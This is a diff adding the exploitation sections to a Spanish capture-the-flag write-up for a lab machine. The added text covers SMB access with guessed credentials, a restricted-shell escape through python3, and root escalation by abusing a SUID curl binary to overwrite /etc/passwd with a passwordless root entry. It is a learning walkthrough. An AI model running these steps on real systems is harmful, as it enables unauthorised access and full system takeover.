@@ -284,8 +284,106 @@ S-1-22-1-1000 Unix User\smbuser (Local User)
 S-1-22-1-1001 Unix User\rabol (Local User)
 ```
 
-el cual "smbuser" probablemente sea del smb y "rabol" de ssh. Si probamos en conectarnos por ssh veremos este mensaje:
+el cual "smbuser" probablemente sea del smb y "rabol" de ssh.
+
+# INTRUSION
+
+Si probamos en conectarnos por ssh veremos este mensaje:
 
 ![ssh](./img/ssh.png)
 
-WRITEUP EN PROGRESO :)
+Ahora si probamos "fuckit" como la contraseña de "smbuser" podremos entrar al smb:
+
+```css
+smbclient //172.17.0.2/share_secret_only -U smbuser%fuckit -W workgroup
+```
+
+estando ahi ejecutamos `get note.txt` para guardarnos una nota que hay, y si la leemos veremos esto:
+
+```tcl
+read better
+```
+
+por lo que luego de probar, vemos que la contraseña de el usuario "rabol" es "share_secret_only" (como en el recurso compartido). `rabol:share_secret_only`
+
+# ESCALADA DE PRIVILEGIOS
+
+### Rabol
+
+### Escapar de `rbash`
+
+Si ejecutamos algun comando veremos que tenemos un `rbash`, lo cual es un bash que está restringido y solo nos permite ejecutar ciertos comandos que están permitidos, ya que nos cambia el PATH a uno que tenga esos comandos permitidos y hace que no se pueda cambiar. Hay varias maneras de escapar dependiendo de los binarios que tengamos permitidos, en este caso, al ejecutar `ls` veremos que si funciona (si no estuviera en la carpeta donde tenemos nuestros binarios no funcionaria) y que hay una carpeta bin, la cual es la que tiene los binarios, y si nos fijamos que tiene veremos esto:
+
+![ls](./img/ls.png)
+
+Sabiendo que tenemos python3, es muy sencillo escapar, solamente tenemos que ejecutar esto:
+
+```python
+python3 -c 'import os; os.system("/bin/bash")'
+```
+
+una vez ejecutado ya estaremos en bash, pero nuestro path sigue siendo el mismo, por lo que ahora ejecutamos esto:
+
+```css
+export PATH=/bin/
+```
+
+Ahora ya podemos hacer todo normal.
+
+### Escalada a root
+
+si vemos los binarios SUID veremos lo siguiente:
+
+![suid](./img/SUID.png)
+
+como vemos está curl, y hay una manera fácil de escalar escribiendo archivos del sistema:
+
+```css
+LFILE=file_to_write
+TF=$(mktemp)
+echo DATA >$TF
+curl "file://$TF" -o "$LFILE"
+```
+
+en este caso escribiremos el `/etc/passwd`, para hacerlo ejecutaremos los comandos anteriores de esta manera:
+
+```css
+LFILE=/etc/passwd
+TF=$(mktemp)
+  cat <<EOF > $TF
+  root::0:0:root:/root:/bin/bash
+  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+  bin:x:2:2:bin:/bin:/usr/sbin/nologin
+  sys:x:3:3:sys:/dev:/usr/sbin/nologin
+  sync:x:4:65534:sync:/bin:/bin/sync
+  games:x:5:60:games:/usr/games:/usr/sbin/nologin
+  man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+  lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+  mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+  news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+  uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+  proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+  backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+  list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+  irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+  _apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+  rabol:x:1001:1001:rabol,,,:/home/rabol:/bin/rbash
+  systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+  systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+  messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
+  systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
+  sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
+  smbuser:x:1000:1000:smbuser,,,:/home/smbuser:/bin/bash
+  EOF
+curl "file://$TF" -o "$LFILE"
+```
+
+Esto va a borrar la "x" de root.
+
+Ahora solo ejecutamos `su` y ya seremos root:
+
+![root](./img/root.png)
+
+Gracias por leer.
